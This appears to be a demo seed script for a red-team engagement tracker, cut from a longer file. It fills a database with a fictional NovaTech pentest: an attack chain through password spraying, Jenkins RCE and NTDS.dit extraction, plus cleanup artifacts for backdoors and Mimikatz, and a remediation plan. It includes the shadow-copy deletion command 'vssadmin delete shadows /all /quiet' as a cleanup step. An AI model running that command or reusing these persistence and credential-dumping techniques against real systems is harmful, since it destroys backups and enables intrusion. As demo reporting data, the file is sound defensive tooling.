        "steps":       "1. Map all techniques to MITRE ATT&CK framework\n2. Create visual attack path diagram\n3. Document dwell time and detection opportunities\n4. Calculate business impact for each node in the chain",
        "expected":    "Clear end-to-end attack narrative from external position to crown jewels.",
        "actual":      "6-hop attack chain documented: OSINT → Password Spray → SSO → Jenkins credentials → DC → NTDS dump.",
        "executed":    True,
        "successful":  True,
        "notes":       "Total time from first contact to DA: 8 days. Detection opportunities missed: 14.",
    },
    {
        "category":    "REPORTING",
        "title":       "Cloud Security Review — AWS Misconfigurations",
        "description": "Enumerate and test all discoverable AWS resources for misconfigurations.",
        "steps":       "1. Identify AWS account ID and region via metadata exposure\n2. Enumerate public S3 buckets\n3. Test IAM policies for excessive permissions\n4. Check for exposed EC2 instance metadata",
        "expected":    "All S3 buckets private. IAM follows least privilege. IMDSv2 enforced.",
        "actual":      "1 public S3 bucket with database backups and SSH keys. IMDSv1 still enabled on 3 EC2 instances.",
        "executed":    True,
        "successful":  True,
        "notes":       "Terraform state files in the S3 bucket contained AWS access keys — rotated after discovery.",
    },
]

# ──────────────────────────────────────────────────────────────────
# Cleanup Artifacts
# ──────────────────────────────────────────────────────────────────

CLEANUP_ARTIFACTS = [
    {
        "title":       "Reverse shell backdoor — Jenkins server",
        "artifact_type": "BACKDOOR",
        "status":      CleanupArtifactStatus.CLEANED,
        "location":    "jenkins.novatech.io:/tmp/.htaccess_cache",
        "description": "Bash reverse shell script used to establish C2 over TLS on port 443.",
        "cleanup_notes": "File deleted. Cron job entry for persistence also removed from /etc/cron.d/.",
    },
    {
        "title":       "Mimikatz binary — Domain Controller",
        "artifact_type": "TOOL",
        "status":      CleanupArtifactStatus.CLEANED,
        "location":    "10.10.0.5 (dc01) C:\\Windows\\Temp\\svc_host32.exe",
        "description": "Mimikatz reflectively loaded from memory; binary copy dropped to disk for persistence testing.",
        "cleanup_notes": "Binary deleted. Defender exclusion added during test was removed.",
    },
    {
        "title":       "WinRM persistent session — Domain Controller",
        "artifact_type": "PERSISTENCE_MECHANISM",
        "status":      CleanupArtifactStatus.CLEANED,
        "location":    "10.10.0.5 — WinRM service + registered scheduled task",
        "description": "Scheduled task 'WindowsUpdateSvc' created as DA for persistent WinRM re-entry.",
        "cleanup_notes": "Scheduled task deleted. Confirmed removed via schtasks /query output.",
    },
    {
        "title":       "SOCKS5 proxy — Jenkins pivot host",
        "artifact_type": "TOOL",
        "status":      CleanupArtifactStatus.CLEANED,
        "location":    "jenkins.novatech.io — chisel binary at /opt/nexus/chisel",
        "description": "Chisel SOCKS5 proxy used to tunnel Red Team traffic through Jenkins into internal network.",
        "cleanup_notes": "Binary removed. Confirmed no running processes.",
    },
    {
        "title":       "Extracted NTDS.dit — attacker C2",
        "artifact_type": "EXFILTRATED_DATA",
        "status":      CleanupArtifactStatus.CLEANED,
        "location":    "Attacker C2 server — /exfil/novatech/ntds.dit",
        "description": "Full NTDS.dit database dump containing NTLM hashes for all 847 domain accounts.",
        "cleanup_notes": "File cryptographically wiped from C2 server. Hash confirmed 00s via dd. Report copy retained in encrypted Vaultwarden instance for evidence purposes only.",
    },
    {
        "title":       "VSS Shadow Copy on Domain Controller",
        "artifact_type": "PERSISTENCE_MECHANISM",
        "status":      CleanupArtifactStatus.PENDING,
        "location":    "10.10.0.5 — VSS snapshot created during NTDS extraction",
        "description": "Volume Shadow Copy created to extract NTDS.dit — may still exist on DC.",
        "cleanup_notes": "Pending confirmation from client sysadmin. Recommended command: vssadmin delete shadows /all /quiet",
    },
]

# ──────────────────────────────────────────────────────────────────
# Notes
# ──────────────────────────────────────────────────────────────────

NOTES = [
    {
        "title":   "Initial Access — Detailed Kill Chain",
        "content": (
            "## Kill Chain Summary\n\n"
            "**Day 1–2:** Passive reconnaissance. Identified 14 external hosts. "
            "Discovered jenkins.novatech.io via certificate transparency — not in client's scope sheet. "
            "Confirmed in-scope after client notification.\n\n"
            "**Day 3:** Active scanning complete. Swagger UI found on api.novatech.io:8443 — full API surface mapped. "
            "SQL injection discovered in product search endpoint.\n\n"
            "**Day 4–5:** Password spray against SSO portal. 3/312 accounts compromised with 'NovaTech2024!'. "
            "MFA not enforced on any accounts. No lockout triggered.\n\n"
            "**Day 6:** Jenkins Script Console found unauthenticated. RCE achieved. "
            "Jenkins config files contain plaintext DevOps credentials.\n\n"
            "**Day 7:** Pivoted to internal network via Jenkins. WinRM to DC01 with DevOps account. "
            "SeBackupPrivilege present — NTDS.dit extracted. Domain compromised.\n\n"
            "**Day 8–30:** Post-exploitation, persistence mechanisms tested, cloud review completed."
        ),
    },
    {
        "title":   "MITRE ATT&CK Coverage Map",
        "content": (
            "## Techniques Used\n\n"
            "| Tactic | Technique | ID |\n"
            "|--------|-----------|----|\n"
            "| Reconnaissance | Gather Victim Identity Info | T1589 |\n"
            "| Reconnaissance | Search Open Technical Databases | T1596 |\n"
            "| Initial Access | Valid Accounts | T1078 |\n"
            "| Initial Access | Exploit Public-Facing Application | T1190 |\n"
            "| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |\n"
            "| Persistence | Scheduled Task/Job | T1053 |\n"
            "| Defence Evasion | Process Injection | T1055 |\n"
            "| Credential Access | OS Credential Dumping: NTDS | T1003.003 |\n"
            "| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |\n"
            "| Collection | Data from Network Shared Drive | T1039 |\n"
            "| Exfiltration | Exfiltration Over C2 Channel | T1041 |\n\n"
            "**Total coverage: 11 of 14 ATT&CK tactics**"
        ),
    },
    {
        "title":   "Remediation Priority Matrix",
        "content": (
            "## Prioritised Remediation Actions\n\n"
            "### P0 — Immediate (within 24 hours)\n"
            "1. Reset KRBTGT password twice\n"
            "2. Force password reset for all 847 domain accounts\n"
            "3. Restrict Jenkins /script console — require authentication\n"
            "4. Remove public access from novatech-backups S3 bucket\n"
            "5. Rotate all keys found in S3 bucket\n\n"
            "### P1 — Short-term (within 1 week)\n"
            "1. Enforce MFA on all SSO accounts\n"
            "2. Implement account lockout policies on SSO portal\n"
            "3. Patch Cisco ASA to remediate CVE-2021-1609\n"
            "4. Remediate SQL injection in product search API\n\n"
            "### P2 — Medium-term (within 30 days)\n"
            "1. Deploy network segmentation between DMZ and internal LAN\n"
            "2. Deploy Defender for Endpoint to all server workloads\n"
            "3. Implement HTTP security headers across all endpoints\n"
            "4. Disable TLS 1.0/1.1 across all services\n"
            "5. Audit and revoke unnecessary SeBackupPrivilege assignments"
        ),
    },
]


# ──────────────────────────────────────────────────────────────────
# Seed runner
# ──────────────────────────────────────────────────────────────────

async def seed():
    async with AsyncSessionLocal() as db:
        # Guard — skip if already seeded
        existing = await db.execute(
            select(Engagement).where(Engagement.name == ENGAGEMENT_NAME)
        )
        if existing.scalar_one_or_none():
            print(f"⚠️  Engagement '{ENGAGEMENT_NAME}' already exists — skipping seed.")
            print("    Delete it in the UI first if you want to re-seed.")
            return

        # ── Admin user ─────────────────────────────────────────────
        user_result = await db.execute(select(User).limit(1))
        user = user_result.scalar_one_or_none()
        if not user:
            print("❌ No users found. Create an admin account first.")
            return
        print(f"🔑 Seeding as user: {user.username}")

        # ── Engagement ─────────────────────────────────────────────
        eng = Engagement(
            **{k: v for k, v in ENGAGEMENT.items()},
            created_by=user.id,
        )
        db.add(eng)
        await db.flush()
        print(f"✅ Created engagement: {eng.name}")

        # ── Phases ─────────────────────────────────────────────────
        for p in PHASES:
            db.add(EngagementPhase(engagement_id=eng.id, **p))
        await db.flush()
        print(f"   {len(PHASES)} phases created")

        # ── Assets ─────────────────────────────────────────────────
        asset_objects = []
        for a in ASSETS:
            a_copy = dict(a)  # avoid mutating the module-level ASSETS list
            ports = a_copy.pop("ports", [])
            asset = Asset(
                engagement_id=eng.id,
                created_by=user.id,
                **a_copy,
            )
            db.add(asset)
            await db.flush()
            for (port_num, proto, service, state, version) in ports:
                db.add(AssetPort(
                    asset_id=asset.id,
                    port_number=port_num,
                    protocol=PortProtocol(proto),
                    service_name=service,
                    state=PortState(state),
                    version=version,
                ))
            asset_objects.append(asset)
        await db.flush()
        print(f"   {len(asset_objects)} assets created with port data")

        # ── Findings ───────────────────────────────────────────────
        finding_objects = []
        for f in FINDINGS:
            f_copy = dict(f)  # avoid mutating module-level FINDINGS
            asset_idxs = f_copy.pop("asset_idx", [])
            finding = Finding(
                engagement_id=eng.id,
                created_by=user.id,
                created_at=eng.start_date,
                **f_copy,
            )
            db.add(finding)
            await db.flush()
            for idx in asset_idxs:
                if idx < len(asset_objects):
                    db.add(FindingAsset(
                        finding_id=finding.id,
                        asset_id=asset_objects[idx].id,
                        remediated=False,
                    ))
            finding_objects.append(finding)
        await db.flush()
        print(f"   {len(finding_objects)} findings created")

        # ── Test Cases ─────────────────────────────────────────────
        testcase_objects = []
        for tc in TESTCASES:
            testcase = TestCase(
                engagement_id=eng.id,
                created_by=user.id,
                title=tc["title"],
                category=tc["category"],
                description=tc["description"],
                steps=tc["steps"],
                expected_result=tc["expected"],
                actual_result=tc.get("actual"),
                is_executed=tc["executed"],
                is_successful=tc["successful"] if tc["executed"] else None,
                notes=tc.get("notes"),
            )
            db.add(testcase)
            testcase_objects.append(testcase)
        await db.flush()
        print(f"   {len(testcase_objects)} test cases created")

        # ── Cleanup Artifacts ──────────────────────────────────────
        for ca in CLEANUP_ARTIFACTS:
            db.add(CleanupArtifact(
                engagement_id=eng.id,
                created_by=user.id,
                **ca,
            ))
        await db.flush()
        print(f"   {len(CLEANUP_ARTIFACTS)} cleanup artifacts created")

        # ── Notes ──────────────────────────────────────────────────
        for n in NOTES:
            db.add(Note(
                engagement_id=eng.id,
                created_by=user.id,
                **n,
            ))
        await db.flush()
        print(f"   {len(NOTES)} notes created")

        await db.commit()

        print("\n" + "="*60)
        print("🚀  REDWIRE DEMO SEED COMPLETE")
        print("="*60)
        print(f"  Engagement:   {eng.name}")
        print(f"  Client:       {eng.client_name}")
        print(f"  Status:       {eng.status.value}")
        print(f"  Assets:       {len(asset_objects)}")
        print(f"  Findings:     {len(finding_objects)}")
        sev_counts = {}
        for f in finding_objects:
            k = f.severity.value
            sev_counts[k] = sev_counts.get(k, 0) + 1
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if sev_counts.get(sev, 0):
                print(f"    {sev:<10} {sev_counts[sev]}")
        print(f"  Test Cases:   {len(testcase_objects)}")
        print(f"  Cleanup:      {len(CLEANUP_ARTIFACTS)}")
        print(f"  Notes:        {len(NOTES)}")
        print("="*60)


if __name__ == "__main__":
    asyncio.run(seed())
